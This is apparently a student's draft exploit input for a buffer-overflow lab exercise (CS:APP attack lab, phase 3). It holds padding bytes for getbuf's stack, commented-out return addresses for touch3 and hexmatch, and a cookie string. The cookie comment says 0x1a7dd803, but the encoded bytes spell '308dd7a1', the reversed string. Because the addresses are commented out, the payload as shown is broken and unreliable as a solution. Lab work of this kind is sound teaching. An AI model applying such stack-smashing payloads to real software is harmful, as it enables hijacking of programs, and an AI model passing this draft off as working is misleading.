/* 56 bytes of getbuf stack */
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41

/* 112 bytes of hexmatch stack */
/* 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 */

/* 0x00000000004018c4 touch3 address */ 
/* c4 18 40 00 00 00 00 00 */

/* 0x0000000000401846 hexmatch address */
/* 46 18 40 00 00 00 00 00 */

/* 0x1a7dd803 Cookie */
33 30 38 64 64 37 61 31
00 /* Newline */

/* test after string */
41
